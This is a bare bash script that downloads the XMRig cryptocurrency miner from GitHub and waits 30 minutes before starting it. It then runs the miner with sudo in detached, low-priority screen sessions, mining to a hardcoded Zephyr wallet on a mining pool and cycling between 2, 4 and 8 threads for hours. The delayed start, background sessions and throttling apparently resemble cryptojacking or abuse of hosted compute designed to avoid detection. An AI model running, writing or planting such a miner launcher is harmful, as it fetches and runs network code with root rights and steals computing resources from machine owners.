#!/bin/bash

curl https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz -L -O -J
tar -xf xmrig-6.20.0-linux-x64.tar.gz
cd ./xmrig-6.20.0
sleep 1800
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=2 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=4 -k --randomx-1gb-pages
sleep 1800
screen -ls | grep Detached | cut -d. -f1 | awk '{print $1}' | xargs kill
sleep 5
screen -d -m nice -n 19 sudo ./xmrig --algo="rx/0" -o ru.zephyr.herominers.com:1123 -u ZEPHs6qaBnejgPSRxmUdzjVH636JsxU2vCUMKtkeyPEehqCbY5bB1kzcNCBcN4f8bW214Ua9r3FnCSnF2Jqe6DiTQCFagYP7qtT -p xolen --tls --threads=8 -k --randomx-1gb-pages
sleep 3600
